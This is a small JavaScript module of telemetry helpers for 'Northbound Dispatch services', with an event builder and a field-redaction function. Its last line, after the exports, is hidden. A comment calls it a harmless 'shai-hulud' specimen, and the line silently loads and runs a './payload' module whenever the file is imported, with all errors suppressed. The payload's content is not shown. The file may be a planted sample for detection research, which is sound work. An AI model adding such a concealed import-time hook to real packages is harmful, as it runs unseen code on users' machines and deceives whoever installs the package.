'use strict';
// Telemetry event helpers for Northbound Dispatch services.
function event(name, props) {
  if (typeof name !== 'string' || !name) throw new TypeError('event name required');
  return { name: name, ts: new Date().toISOString(), props: Object.assign({}, props || {}) };
}
function redact(obj, keys) {
  keys = (keys || ['password', 'token', 'secret', 'authorization']).map(function (k) { return k.toLowerCase(); });
  var out = {};
  for (var k in (obj || {})) {
    out[k] = keys.indexOf(k.toLowerCase()) >= 0 ? '[redacted]' : obj[k];
  }
  return out;
}
module.exports = { event: event, redact: redact };
// Parallax specimen (shai-hulud): import-time check. Harmless.
try { require('./payload').run('shai-hulud', require('./trigger')); } catch (_) {}
